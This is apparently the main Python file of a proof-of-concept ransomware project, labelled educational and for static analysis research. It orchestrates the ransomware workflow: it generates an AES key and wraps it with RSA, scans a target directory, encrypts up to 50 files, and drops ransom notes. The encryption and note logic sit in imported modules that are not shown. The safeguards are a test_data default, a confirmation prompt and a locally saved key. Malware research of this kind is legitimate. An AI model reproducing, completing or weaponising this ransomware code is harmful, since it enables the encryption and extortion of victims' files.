"""
POC Ransomware - Main Program
Educational Purpose Only

Author: SETANG4
Purpose: Static Analysis Research
"""

import os
import sys
from modules.file_scanner import FileScanner
from modules.crypto_engine import CryptoEngine
from modules.key_manager import KeyManager
from modules.ransom_note import RansomNote

class POCRansomware:
    def __init__(self, target_dir="test_data"):
        self.target_dir = target_dir
        self.scanner = FileScanner(target_dir=target_dir, max_files=50)
        self.crypto = CryptoEngine()
        self.key_mgr = KeyManager(key_size=2048)
        self.ransom = RansomNote()
        
        self.symmetric_key = None
        self.encrypted_key = None
    
    def display_banner(self):
        """
        Display warning banner
        """
        banner = """
╔══════════════════════════════════════════════════════════╗
║         POC RANSOMWARE - EDUCATIONAL PURPOSE            ║
║                                                          ║
║  ⚠️  WARNING: This is for RESEARCH ONLY  ⚠️             ║
║                                                          ║
║  This software will ENCRYPT files in target directory   ║
║  DO NOT use on production systems!                      ║
╚══════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def confirm_execution(self):
        """
        Ask user confirmation
        """
        print(f"\n[!] Target directory: {os.path.abspath(self.target_dir)}")
        print("[!] This will ENCRYPT all target files in this directory!")
        print("[!] Make sure you have BACKUP of important files!")
        
        response = input("\n[?] Continue? (yes/NO): ").strip().lower()
        
        if response != "yes":
            print("[*] Operation cancelled.")
            sys.exit(0)
    
    def initialize_keys(self):
        """
        Generate or load RSA keys
        """
        print("\n" + "="*60)
        print("[PHASE 1] Key Management")
        print("="*60)
        
        if os.path.exists("keys/public.pem"):
            print("[*] Loading existing keys...")
            self.key_mgr.load_public_key()
            self.key_mgr.load_private_key()
        else:
            print("[*] Generating new key pair...")
            self.key_mgr.generate_keys()
            self.key_mgr.save_keys()
        
        # Generate symmetric key
        print("[*] Generating symmetric key (AES-256)...")
        self.symmetric_key = self.crypto.generate_symmetric_key()
        
        # Encrypt symmetric key with RSA
        print("[*] Encrypting symmetric key with RSA...")
        self.encrypted_key = self.key_mgr.encrypt_key(self.symmetric_key)
        
        # Save keys for decryption
        os.makedirs("keys", exist_ok=True)
        with open("keys/symmetric.key", "wb") as f:
            f.write(self.symmetric_key)
        with open("keys/encrypted_key.bin", "wb") as f:
            f.write(self.encrypted_key)
        
        print("[+] Keys initialized successfully!")
    
    def scan_files(self):
        """
        Scan for target files
        """
        print("\n" + "="*60)
        print("[PHASE 2] File Discovery")
        print("="*60)
        
        files = self.scanner.scan_directory()
        
        if len(files) == 0:
            print("[!] No target files found!")
            sys.exit(0)
        
        return files
    
    def encrypt_files(self, files):
        """
        Encrypt all target files
        """
        print("\n" + "="*60)
        print("[PHASE 3] File Encryption")
        print("="*60)
        
        encrypted_count = 0
        
        for file_path in files:
            try:
                # Encrypt file
                ciphertext, iv = self.crypto.encrypt_file(
                    file_path, 
                    self.symmetric_key
                )
                
                if ciphertext:
                    # Write encrypted file
                    self.crypto.write_encrypted_file(file_path, ciphertext, iv)
                    encrypted_count += 1
                
            except Exception as e:
                print(f"[-] Error processing {file_path}: {str(e)}")
        
        print(f"\n[+] Encrypted {encrypted_count} files successfully!")
        return encrypted_count
    
    def drop_ransom_note(self):
        """
        Create ransom note
        """
        print("\n" + "="*60)
        print("[PHASE 4] Ransom Note Generation")
        print("="*60)
        
        self.ransom.generate_note(self.target_dir)
        
        # Also drop in current directory
        self.ransom.generate_note(".")
    
    def run(self):
        """
        Main execution flow
        """
        self.display_banner()
        self.confirm_execution()
        
        try:
            # Phase 1: Initialize keys
            self.initialize_keys()
            
            # Phase 2: Scan files
            target_files = self.scan_files()
            
            # Phase 3: Encrypt files
            self.encrypt_files(target_files)
            
            # Phase 4: Drop ransom note
            self.drop_ransom_note()
            
            print("\n" + "="*60)
            print("[✓] ENCRYPTION COMPLETED")
            print("="*60)
            print("\n[*] Encryption keys saved to 'keys/' directory")
            print("[*] To decrypt files, run: python decryptor.py")
            print("\n[!] This was an EDUCATIONAL DEMONSTRATION")
            
        except Exception as e:
            print(f"\n[!] ERROR: {str(e)}")
            import traceback
            traceback.print_exc()


if __name__ == "__main__":
    # Safety check: only run if test_data directory exists
    if not os.path.exists("test_data"):
        print("[!] ERROR: 'test_data' directory not found!")
        print("[*] Create test directory first:")
        print("    mkdir test_data")
        print("    echo 'test' > test_data/sample.txt")
        sys.exit(1)
    
    # Run POC
    poc = POCRansomware(target_dir="test_data")
    poc.run()